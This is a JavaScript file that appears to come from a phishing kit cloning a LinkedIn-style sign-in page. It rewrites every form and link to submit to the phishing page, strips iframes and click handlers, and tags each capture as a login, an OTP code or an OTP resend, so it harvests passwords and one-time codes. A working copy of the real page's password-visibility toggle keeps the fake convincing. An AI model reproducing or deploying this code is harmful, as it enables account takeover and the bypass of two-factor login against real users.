let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

let session_key = document.querySelector(`[name="session_key"]`)
let session_password = document.querySelector(`[name="session_password"]`)
let input__phone_verification_pin = document.querySelector("#input__phone_verification_pin")


if (session_key && session_password) {
    addSpikeType("login")
}
else if (input__phone_verification_pin) {
    addSpikeType("otp_code")
}



// functions
let showPassBtn = document.querySelector(`[data-id="sign-in-form__password-visibility-toggle"]`)
let showPassBtn2 = document.querySelector(`#password-visibility-toggle`)
let showPass = false
if (showPassBtn) {
    showPassBtn.addEventListener("click", () => {
        if (showPass == false) {
            session_password.type = "text"
            showPass = true
        } else {
            session_password.type = "password"
            showPass = false
        }
    })
}

if (showPassBtn2) {
    showPassBtn2.addEventListener("click", () => {
        if (showPass == false) {
            session_password.type = "text"
            showPass = true
        } else {
            session_password.type = "password"
            showPass = false
        }
    })
}

let resendOtpBtn = document.querySelector("#btn-resend-pin-sms")
if (resendOtpBtn) {
    resendOtpBtn.addEventListener("click", () => {
        input__phone_verification_pin.required = false
        addSpikeType("resend_otp")
        resendOtpBtn.type = "submit"
    })
}

